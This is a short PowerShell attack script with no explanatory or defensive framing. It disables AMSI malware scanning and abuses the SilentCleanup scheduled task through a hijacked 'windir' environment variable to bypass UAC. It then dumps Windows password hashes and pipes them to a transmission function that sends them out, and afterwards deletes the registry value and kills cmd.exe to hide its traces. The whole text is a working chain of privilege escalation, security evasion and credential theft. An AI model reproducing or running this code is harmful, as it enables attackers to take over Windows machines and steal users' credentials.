.\AMSI-Bypass.ps1
$registryPath = "HKCU:\Environment"
$Name = "windir"
$Value = "powershell -windowstyle hidden import-module " + "'" + (resolve-path .\AMSI-Bypass.ps1) + "'" + ";import-module " + "'" + (resolve-path .\Get-PassHashes.ps1) + "'" + ";import-module " + "'" + (resolve-path .\Send.ps1) + "'" + ";Get-PassHashes | Out-String | Invoke-Transmission -ip 'localhost';#"
Set-ItemProperty -Path $registryPath -Name $name -Value $Value
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
sleep 2
Remove-ItemProperty -Path $registryPath -Name $name
taskkill /f /im cmd.exe